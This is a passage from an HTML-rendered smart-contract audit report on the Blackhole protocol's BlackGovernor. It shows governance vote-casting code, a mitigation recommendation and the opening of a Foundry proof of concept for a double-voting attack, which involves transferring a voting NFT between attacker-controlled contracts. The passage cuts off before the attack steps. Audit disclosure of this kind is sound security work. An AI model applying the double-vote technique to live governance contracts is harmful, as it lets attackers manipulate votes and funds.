class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003estate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eActive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Governor: vote not currently active\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eproposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evoteStart\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetDeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003e_countVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eVoteCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereason\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eVoteCastWithParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ereason\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eweight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-18\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-18\" aria-label=\"recommended mitigation steps 18 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003ePerform a check just like in \u003ccode\u003eVotingEscrow::balanceOfNFT\u003c/code\u003e whether ownership was changed in the current block number.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-12\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-12\" aria-label=\"proof of concept 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThis POC is written in foundry, in order to run it, one has to create foundry project, download dependencies, create remappings and change imports in some of the file to look inside the “src” folder\u003c/p\u003e\n\u003cp\u003eThe POC is the simple version of the finding, in order to run it one has to first change the code of the Governor, so that other vulnerability in the code is fixed, as without that change proposals DO NOT WORK. Look at the \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-163\"\u003e\u003ccode\u003egetVotes\u003c/code\u003e inside the \u003ccode\u003eBlackGovernor\u003c/code\u003e incorrectly provides \u003ccode\u003eblock.number\u003c/code\u003e instead of \u003ccode\u003eblock.timestamp\u003c/code\u003e, leading to complete DOS of proposal functionality\u003c/a\u003e finding.\u003c/p\u003e\n\u003cp\u003eThis POC is not perfect, as it utilizes also vulnerability found in \u003ccode\u003egetsmNFTPastVotes\u003c/code\u003e (finding that if provided timestamp to the function is smaller than the timestamp of the first checkpoint, function evaluates \u003ccode\u003etokenIds\u003c/code\u003e from the first checkpoint) that is also submitted. However, if one would create a contract that casts a vote at \u003ccode\u003evoteStart\u003c/code\u003e timestamp, transfers NFT to another attacker controlled smart contract, the outcome will be the same.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/Black.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMinterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/MinterUpgradeable.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/RewardsDistributor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePermissionsRegistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PermissionsRegistry.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTokenHandler\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/TokenHandler.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVoterV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VoterV3.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/VotingEscrow.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAutoVotingEscrowManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AVM/AutoVotingEscrowManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/GaugeManager.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/PairGenerator.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/GaugeFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/factories/PairFactory.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/AlgebraCLVe33/GaugeFactoryCL.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/BlackGovernor.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIBlackHoleVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IBlackHoleVotes.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;../src/interfaces/IMinter.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDoubleVoteTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBlack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eRewardsDistributor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan 